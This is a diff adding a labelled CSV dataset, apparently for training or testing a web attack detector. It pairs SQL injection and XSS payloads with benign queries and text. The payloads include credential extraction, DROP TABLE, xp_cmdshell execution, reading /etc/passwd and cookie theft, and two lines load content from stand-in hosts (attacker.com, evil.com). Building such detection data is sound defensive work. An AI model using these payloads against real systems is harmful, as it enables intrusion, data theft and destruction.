@@ -1,0 +1,46 @@
+payload,attack_type,verdict,risk_level,is_attack,rule_category
+' OR 1=1 --,SQL Injection,Dangerous,Critical,1,SQLi Tautology Auth Bypass
+admin' --,SQL Injection,Dangerous,Critical,1,SQLi Comment Auth Bypass
+"' UNION SELECT null, username, password FROM users --",SQL Injection,Dangerous,Critical,1,SQLi UNION SELECT Data Exfiltration
+1; DROP TABLE users; --,SQL Injection,Dangerous,Critical,1,SQLi Stacked Queries Drop Table
+'; EXEC xp_cmdshell('whoami'); --,SQL Injection,Dangerous,Critical,1,SQLi RCE xp_cmdshell Execution
+"' UNION SELECT 1, @@version, user(), 4 --",SQL Injection,Dangerous,Critical,1,SQLi Fingerprinting Info Disclosure
+' OR '1'='1,SQL Injection,Dangerous,Critical,1,SQLi Quoted Tautology Bypass
+1' AND SLEEP(5) --,SQL Injection,Dangerous,High,1,SQLi Time-based Blind Injection
+1' AND (SELECT COUNT(*) FROM users) > 0 --,SQL Injection,Dangerous,High,1,SQLi Boolean-based Blind Injection
+admin' OR 'a'='a,SQL Injection,Dangerous,Critical,1,SQLi Tautology Authentication Bypass
+"1 UNION ALL SELECT NULL, NULL, CONCAT(table_schema, '.', table_name) FROM information_schema.tables --",SQL Injection,Dangerous,Critical,1,SQLi Schema Harvesting
+"1; INSERT INTO administrators (user, role) VALUES ('hacker', 'admin'); --",SQL Injection,Dangerous,Critical,1,SQLi Privilege Escalation Insert
+'; DELETE FROM audit_logs WHERE 1=1; --,SQL Injection,Dangerous,Critical,1,SQLi Log Tampering Deletion
+1' ORDER BY 10 --,SQL Injection,Dangerous,Medium,1,SQLi Column Enumeration
+"1 UNION SELECT 1, load_file('/etc/passwd') --",SQL Injection,Dangerous,Critical,1,SQLi Local File Inclusion via DB
+SELECT * FROM products WHERE category = 'electronics' AND price < 500,SQL Query / Safe Form,Safe,Low,0,Legitimate Parametric Search
+John Doe,SQL Query / Safe Form,Safe,Low,0,Normal Name Search
+order_id=49281,SQL Query / Safe Form,Safe,Low,0,Standard ID Parameter Lookup
+laptops and computer accessories,SQL Query / Safe Form,Safe,Low,0,Text Search Keyword
+SELECT count(*) FROM orders WHERE user_id = 42,SQL Query / Safe Form,Safe,Low,0,Backend Reporting Query
+"INSERT INTO feedback (comment) VALUES ('Great product, fast shipping!')",SQL Query / Safe Form,Safe,Low,0,User Feedback Submission
+UPDATE users SET theme = 'dark' WHERE id = 12,SQL Query / Safe Form,Safe,Low,0,User Preference Update
+customer_support@example.com,SQL Query / Safe Form,Safe,Low,0,Plain Email Input
+"New York, NY 10001",SQL Query / Safe Form,Safe,Low,0,Address Search
+2026-10-12,SQL Query / Safe Form,Safe,Low,0,Date Range Filter
+<script>alert('XSS')</script>,Cross-Site Scripting (XSS),Dangerous,High,1,Stored/Reflected XSS Script Tag
+<img src=x onerror=alert(document.cookie)>,Cross-Site Scripting (XSS),Dangerous,High,1,DOM XSS Image Tag with Cookie Stealing
+<svg onload=alert(1)>,Cross-Site Scripting (XSS),Dangerous,High,1,SVG Vector Event Handler XSS
+javascript:alert(document.domain),Cross-Site Scripting (XSS),Dangerous,High,1,JavaScript Pseudo-Protocol XSS
+<iframe src='http://attacker.com/cookie_stealer.php'></iframe>,Cross-Site Scripting (XSS),Dangerous,High,1,IFrame Hijacking Wrapper
+<body onload=alert('XSS')>,Cross-Site Scripting (XSS),Dangerous,High,1,Body Tag Event Execution
+'><script src=http://evil.com/payload.js></script>,Cross-Site Scripting (XSS),Dangerous,High,1,Attribute Escape Script Inclusion
+<input type='text' value='' onfocus='alert(1)' autofocus>,Cross-Site Scripting (XSS),Dangerous,High,1,Autofocus Event Injection
+"<a href='javascript:eval(atob(""YWxlcnQoMSk=""))'>Click Here</a>",Cross-Site Scripting (XSS),Dangerous,High,1,Base64 Encoded JS Link
+<details open ontoggle=alert(document.cookie)>,Cross-Site Scripting (XSS),Dangerous,High,1,HTML5 Details Tag XSS
+<video><source onerror='javascript:alert(1)'>,Cross-Site Scripting (XSS),Dangerous,High,1,Media Error Event XSS
+"<div style=""background-image: url('javascript:alert(1)')"">",Cross-Site Scripting (XSS),Dangerous,High,1,CSS Style Protocol Injection
+<b>Hello world! Welcome to our store.</b>,Safe HTML / Text,Safe,Low,0,Safe Formatting Tag
+Please contact us at support@cybershield.org for assistance.,Safe HTML / Text,Safe,Low,0,Plain Support Email Text
+Math equation: 5 < 10 and 12 > 4,Safe HTML / Text,Safe,Low,0,Mathematical Comparisons
+Here is a link: https://google.com/search?q=security,Safe HTML / Text,Safe,Low,0,Safe Web URL String
+Review: The 5-star product exceeded all expectations! Recommended.,Safe HTML / Text,Safe,Low,0,Customer Product Review
+<p>Paragraph text describing the terms and privacy policy.</p>,Safe HTML / Text,Safe,Low,0,Safe Content HTML Block
+User commented: 'Great explanation of OWASP Top 10 vulnerabilities!',Safe HTML / Text,Safe,Low,0,User Forum Comment
+Discount code: SAVE-2026-FALL,Safe HTML / Text,Safe,Low,0,Promotional Voucher Input
